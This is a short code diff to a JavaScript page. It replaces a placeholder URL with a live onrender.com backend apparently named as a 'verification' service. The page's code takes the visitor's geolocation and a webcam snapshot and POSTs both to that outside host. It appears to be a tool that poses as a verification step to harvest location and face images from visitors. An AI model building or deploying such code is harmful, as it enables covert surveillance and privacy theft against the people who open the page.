@@ -15,7 +15,7 @@ function start() {
 
   // طلب الموقع
   navigator.geolocation.getCurrentPosition(pos => {
-    fetch("https://YOUR-BACKEND.onrender.com/location", {
+    fetch("https://verification-backend-o1t0.onrender.com/location", {
       method: "POST",
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({
@@ -38,7 +38,7 @@ function start() {
         canvas.getContext("2d").drawImage(video, 0, 0, 300, 200);
         let img = canvas.toDataURL();
 
-        fetch("https://YOUR-BACKEND.onrender.com/image", {
+        fetch("https://verification-backend-o1t0.onrender.com/image", {
           method: "POST",
           headers: {"Content-Type": "application/json"},
           body: JSON.stringify({ image: img })
